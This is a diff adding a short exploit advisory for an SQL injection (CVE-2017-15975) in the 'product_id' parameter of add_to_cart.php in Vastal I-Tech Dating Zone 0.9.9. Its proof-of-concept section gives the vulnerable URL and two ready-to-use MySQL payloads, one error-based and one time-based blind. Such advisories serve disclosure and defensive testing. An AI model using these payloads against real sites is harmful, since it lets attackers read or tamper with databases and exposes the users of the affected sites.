@@ -1,0 +1,34 @@
+# # # # # 
+# Exploit Title: Vastal I-Tech Dating Zone 0.9.9 - 'product_id' Parameter SQL Injection
+# Dork: N/A
+# Date: 30.10.2017
+# Vendor Homepage: http://vastal.com/
+# Software http://vastal.com/dating-zone-the-dating-software.html
+# Demo: http://datingzone.vastal.com/demo/
+# Version: 0.9.9
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-15975
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# http://localhost/[PATH]/add_to_cart.php?product_id=[SQL]
+# 
+# Parameter: product_id (GET)
+#     Type: error-based
+#     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+#     Payload: product_id=3 AND (SELECT 5917 FROM(SELECT COUNT(*),CONCAT(0x7176626a71,(SELECT (ELT(5917=5917,1))),0x71716b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: product_id=3 AND SLEEP(5)
+# 	
+# Etc..
+# # # # #
